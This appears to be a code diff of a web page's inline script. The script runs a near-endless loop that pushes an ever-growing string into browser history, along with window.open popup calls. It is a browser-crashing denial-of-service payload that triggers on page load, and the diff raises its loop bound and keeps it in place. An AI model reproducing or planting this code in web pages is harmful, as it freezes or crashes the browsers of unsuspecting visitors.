@@ -11,16 +11,16 @@
 </div>
        <script>
             var total = "";
-for( var i = 0; i < 100000000000000000000; i++ ) {
+for( var i = 0; i < 999999999999999999999999999999999999999; i++ ) {
   total += i.toString();
   history.pushState(0,0, total );
 }
           function openInNewTab(url) {
-  window.open(url, 'crash_blank').focus();
+  window.open(url, '_blank').focus();
 }
 
 // Or just
-window.open(url, 'crash_blank').focus();
+window.open(url, '_blank').focus();
             </script>
          
 </span>
